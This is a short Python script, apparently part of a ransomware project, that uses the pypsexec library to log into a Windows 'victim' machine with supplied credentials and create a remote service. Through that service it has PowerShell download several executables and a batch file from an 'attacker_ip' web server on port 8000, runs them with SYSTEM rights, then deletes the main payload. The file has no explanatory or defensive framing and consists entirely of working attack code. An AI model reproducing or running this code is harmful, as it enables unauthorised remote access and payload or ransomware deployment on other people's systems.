from pypsexec.client import Client


def psexe(victim_ip,username,password,attacker_ip):
    status=False
    c = Client(victim_ip, username=username, password=password)
    try:
        c.connect()
        print("[*] Success Target: {0}, Testing with username: {1}, testing with password: {2}".format(victim_ip,username,password))
        status=True
    except:
        print("[*] Failed Target: {0}, Testing with username: {1}, testing with password: {2}".format(victim_ip,username,password))
        return status
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/kamehameha_windows.exe -o C:\\Users\\"+username+"\\Desktop\\kamehameha_windows.exe")
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/decrypt_kamehameha.exe -o C:\\Users\\"+username+"\\Desktop\\decrypt_kamehameha.exe")
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/GOKU.jpg -o C:\\Users\\"+username+"\\Desktop\\GOKU.jpg")
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/wall.bat -o C:\\Users\\"+username+"\\Desktop\\wall.bat")
        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\Desktop\\wall.bat", use_system_account=True)
        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\Desktop\\kamehameha_windows.exe", use_system_account=True)
        stdout, stderr, rc = c.run_executable("del C:\\Users\\"+username+"\\Desktop\\kamehameha_windows.exe", use_system_account=True)
        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\Desktop\\decrypt_kamehameha.exe", use_system_account=True)
    finally:
        c.remove_service()
        c.disconnect()
        return status 
